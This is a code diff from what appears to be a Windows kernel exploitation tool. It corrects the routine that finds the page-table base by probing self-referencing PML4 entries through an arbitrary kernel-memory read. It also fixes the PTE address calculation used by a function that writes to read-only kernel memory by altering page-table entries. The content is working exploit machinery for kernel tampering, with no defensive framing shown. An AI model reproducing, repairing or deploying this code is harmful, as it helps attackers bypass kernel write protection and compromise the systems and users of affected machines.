@@ -1545,17 +1545,20 @@ static BOOL IsCanonicalKernelAddr(ULONG64 addr) {
     return (addr >> 48) == 0xFFFF;
 }
 
+static ULONG64 VaToPteAddr(ULONG64 pteBase, ULONG64 va) {
+    return pteBase + (((LONG64)va >> 9) & 0x7FFFFFFFF8ULL);
+}
+
 static ULONG64 FindPteBase() {
     if (g_PteBase) return g_PteBase;
 
     ULONG64 kernelBase = (ULONG64)g_KernelBase;
-    ULONG64 pteOffset = (kernelBase >> 12) << 3;
 
-    DbgLog("  FindPteBase: probing %d PML4 indices for self-ref entry...", 256);
+    DbgLog("  FindPteBase: probing 256 PML4 indices (SAR formula)...");
 
     for (int idx = 256; idx < 512; idx++) {
         ULONG64 candidate = 0xFFFF000000000000ULL | ((ULONG64)idx << 39);
-        ULONG64 pteAddr = candidate + pteOffset;
+        ULONG64 pteAddr = VaToPteAddr(candidate, kernelBase);
 
         if (!IsCanonicalKernelAddr(pteAddr)) continue;
 
@@ -1563,14 +1566,14 @@ static ULONG64 FindPteBase() {
         if (!KM_ReadKernelMemory(pteAddr, &pte, sizeof(pte))) continue;
 
         if ((pte & 1) && (pte & 0xFFFFFFFFFF000ULL)) {
-            ULONG64 testAddr2 = candidate + (((kernelBase + 0x1000) >> 12) << 3);
+            ULONG64 pteAddr2 = VaToPteAddr(candidate, kernelBase + 0x1000);
             ULONG64 pte2 = 0;
-            if (KM_ReadKernelMemory(testAddr2, &pte2, sizeof(pte2)) &&
+            if (KM_ReadKernelMemory(pteAddr2, &pte2, sizeof(pte2)) &&
                 (pte2 & 1) && (pte2 & 0xFFFFFFFFFF000ULL)) {
                 g_PteBase = candidate;
                 DbgLog("  FindPteBase: found PTE_BASE=0x%llX (PML4 idx=%d)", candidate, idx);
-                DbgLog("  FindPteBase: verify PTE[KernelBase]=0x%llX PTE[KernelBase+0x1000]=0x%llX",
-                    pte, pte2);
+                DbgLog("  FindPteBase: PTE[KernelBase]=0x%llX at 0x%llX", pte, pteAddr);
+                DbgLog("  FindPteBase: PTE[KernelBase+0x1000]=0x%llX at 0x%llX", pte2, pteAddr2);
                 return g_PteBase;
             }
         }
@@ -1589,7 +1592,7 @@ BOOL KM_WriteToReadOnlyMemory(ULONG64 kernelAddr, PVOID buffer, SIZE_T size) {
         return FALSE;
     }
 
-    ULONG64 pteAddr = pteBase + ((kernelAddr >> 12) << 3);
+    ULONG64 pteAddr = VaToPteAddr(pteBase, kernelAddr);
     DbgLog("  WriteToReadOnly: PTE at VA=0x%llX", pteAddr);
 
     ULONG64 origPte = 0;
